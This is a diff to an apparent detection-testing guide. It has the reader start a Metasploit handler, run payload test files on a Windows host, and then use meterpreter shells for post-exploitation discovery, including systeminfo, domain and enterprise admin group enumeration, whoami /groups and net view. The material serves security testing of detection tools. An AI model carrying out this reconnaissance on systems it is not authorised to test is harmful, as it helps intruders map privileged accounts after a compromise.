@@ -22,4 +22,47 @@ Start you MSF listener on your attacker host. The msf.rc is a configuration file
 sudo msfconsole -r msf.rc
 ```
 
-Run the three test files from 1 to 3 by simply double clicking, and record the detection results. It is recommended to right click and run at least one of the payload as Administrator to facilitate later testing for privesc.
+Run the three test files from 1 to 3 by simply double clicking, and record the detection results. It is recommended to right click and run at least one of the payloads as Administrator to facilitate later testing for privesc.
+
+## Discovery
+
+The rests of the tests will be ran from out created meterpreter sessions.
+
+First let's run systeminfo on the system:
+(session -i start an interactive sessions where N is the number of the meterpreter session your host has established.)
+```
+msf6 exploit(multi/handler) > sessions -i N
+[*] Starting interaction with N...
+
+meterpreter > shell
+
+
+systeminfo
+```
+
+The second discover task is to look for connected domain trusts and administrative accounts.
+
+*Execute these commands using a shell that is not SYSTEM but a domain user account*
+```
+msf6 exploit(multi/handler) > sessions -i N
+[*] Starting interaction with N...
+
+meterpreter > shell
+
+net group "enterprise admins" /domain
+net group "domain admins" /domain
+```
+
+The third discovery task will look for local accounts and groups.
+
+```
+msf6 exploit(multi/handler) > sessions -i N
+[*] Starting interaction with N...
+
+meterpreter > shell
+
+whoami /groups
+net view /all
+```
+
+
